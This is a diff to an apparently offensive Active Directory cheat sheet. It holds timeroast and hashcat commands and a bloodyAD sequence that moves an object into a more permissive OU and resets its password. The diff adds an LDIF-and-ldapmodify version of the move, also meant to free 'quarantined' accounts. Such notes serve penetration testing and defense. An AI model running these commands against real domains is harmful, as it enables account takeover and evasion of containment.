@@ -187,10 +187,21 @@ nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
 hashcat --username -a0 -m31300 hashes.txt <WORDLIST>   # mode needs a recent hashcat (7.x); older builds lack it
 ```
 
-Object relocation across OUs — if you can write `distinguishedName` on an object, moving it into a more permissive OU makes it inherit that OU's ACL (useful when one tier/OU has a stray `GenericAll`+inherit ACE the others don't):
+Object relocation across OUs — if you can write `distinguishedName` on an object, moving it into a more permissive OU makes it inherit that OU's ACL (useful when one tier/OU has a stray `GenericAll`+inherit ACE the others don't, or to pull a "quarantined" account out of an isolated OU):
 ```bash
 bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CN=target,OU=restrictive-OU,...>' distinguishedName -v '<CN=target,OU=permissive-OU,...>'
 bloodyAD --host <DC_FQDN> -d <domain> -k set password <target> '<newpass>'   # now inherited GenericAll lets this through
+```
+Same move via raw LDAP (works when bloodyAD's syntax doesn't fit, or you only have `ldapmodify`):
+```ldif
+dn: CN=<target>,OU=<source-OU>,DC=<dc1>,DC=<dc2>
+changetype: moddn
+newrdn: CN=<target>
+deleteoldrdn: 1
+newsuperior: OU=<dest-OU>,DC=<dc1>,DC=<dc2>
+```
+```bash
+ldapmodify -H ldap://<DC_FQDN> -D '<USER>@<domain>' -w '<PASS>' -f move.ldif
 ```
 
 Kerberoast encryption downgrade — if `targetedKerberoast` only returns an AES ticket (etype 18, uncrackable without the plaintext), and you hold write on the target's `msDS-SupportedEncryptionTypes`, force RC4 instead of patching Impacket:
